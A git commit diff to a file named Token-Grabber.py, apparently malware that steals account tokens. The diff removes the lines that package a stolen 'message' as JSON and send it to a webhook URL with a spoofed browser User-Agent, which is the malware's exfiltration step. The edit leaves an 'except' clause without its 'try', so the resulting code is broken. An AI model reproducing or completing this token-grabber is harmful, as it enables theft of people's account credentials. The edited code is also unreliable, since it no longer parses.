e9c0642266386d231cc3727d607c535e5db56473
Ranger 404 Script <128408956+Ranger404Script@users.noreply.github.com>
2024-02-26 13:54:30 +0100

    Update Token-Grabber.py

--- Token-Grabber.py
+++ Token-Grabber.py
@@ -20,10 +20,7 @@
         'Content-Type': 'application/json',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
     }
-    payload = json.dumps({'content': message})
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
+
         
     except:
         pass
